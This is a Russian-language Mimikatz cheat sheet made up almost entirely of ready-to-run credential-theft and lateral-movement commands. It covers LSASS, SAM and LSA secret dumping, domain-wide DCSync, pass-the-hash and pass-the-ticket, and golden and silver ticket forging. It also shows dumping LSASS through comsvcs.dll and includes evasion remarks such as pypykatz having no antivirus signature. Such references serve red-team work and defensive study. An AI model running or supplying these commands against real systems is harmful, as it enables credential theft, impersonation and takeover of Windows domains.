## Mimikatz

**Что такое Mimikatz?**

Mimikatz даёт доступ к материалам аутентификации Windows через специализированные модули. Доступ к работающему процессу LSASS требует соответствующих привилегий и может блокироваться защищёнными процессами или Credential Guard; офлайн-анализ зависит от дампа и сборки Windows.

Включение `SeDebugPrivilege` — требуется для большинства команд `mimikatz`.

```
privilege::debug
```

Повышение до токена `SYSTEM` (если запущено с правами администратора).

```
token::elevate
```

Запуск `cmd.exe` с привилегиями `mimikatz`.

```
misc::cmd
```

Запись всего вывода в файл.

```
log /userlogfile.txt
```

Дамп паролей в открытом виде и хэшей из памяти LSASS (WDigest, NTLM, Kerberos).

```
sekurlsa::logonpasswords
```

Дамп учётных данных WDigest — пароли в открытом виде (требуется включённый WDigest).

(Примечание: начиная с Windows 8.1/2012 R2 WDigest по умолчанию отключён, поэтому нужен параметр `UseLogonCredential=1`.)

```
sekurlsa::wdigest
```

Дамп ключей шифрования Kerberos (AES, DES, RC4).

```
sekurlsa::ekeys
```

Дамп паролей Диспетчера учётных данных Windows.

```
sekurlsa::credman
```

Дамп хэшей локальной базы SAM (офлайн — кусты system/sam).

```
lsadump::sam
```

Дамп секретов LSA (пароли сервисных учётных записей, кэшированные учётные данные домена).

```
lsadump::secrets
```

Дамп кэшированных учётных данных домена (хэши DCC2).

```
lsadump::cache
```

DCSync — репликация учётных данных домена без обращения к LSASS (требуются права администратора домена, DA).

```
lsadump::dcsync /domain:corp.local /user:Administrator
```

DCSync всех учётных записей домена в CSV-файл.

```
lsadump::dcsync /domain:corp.local /all /csv
```

Pass-the-Hash — запуск cmd.exe с аутентификацией от имени целевого пользователя.

```
sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:<NTLM_HASH> /run:cmd.exe
```

Pass-the-Hash для RDP (режим Restricted Admin).

```
sekurlsa::pth /user:admin /domain:. /ntlm:<NTLM> /run:"mstsc.exe /restrictedadmin"
```

Перечисление и экспорт билетов Kerberos из памяти.

```
kerberos::list /export
```

Pass-the-Ticket — внедрение билета Kerberos в текущий сеанс.

```
kerberos::ptt ticket.kirbi
```

Удаление всех билетов Kerberos из памяти.

```
kerberos::purge
```

Получение сведений о текущем TGT.

```
kerberos::tgt
```

Создание Golden Ticket (требуется хэш krbtgt) — действует 10 лет, доступ с правами администратора домена.

```
kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<NTLM> /ticket:golden.kirbi
```

Создание Silver Ticket (для конкретной службы, сложнее обнаружить, чем Golden Ticket).

```
kerberos::silver /user:Administrator /domain:corp.local /sid:S-1-5-21-... /target:server.corp.local /service:cifs /rc4:<hash> /ticket:silver.kirbi
```

Получение хэша krbtgt через DCSync для Golden Ticket.

```
lsadump::dcsync /user:krbtgt  # Get krbtgt hash first
```

Дамп LSASS через графический интерфейс (требуются права администратора, может блокироваться EDR).

```
Task Manager → Details → lsass.exe → Create dump file
```

Дамп LSASS через LOLBIN `comsvcs.dll`.

```
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id lsass.dmp full
```

Разбор офлайн-дампа LSASS.
```
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
```

Разбор офлайн-дампа LSASS средствами pypykatz (Python, no AV signature)

```
pypykatz lsa minidump lsass.dmp
```
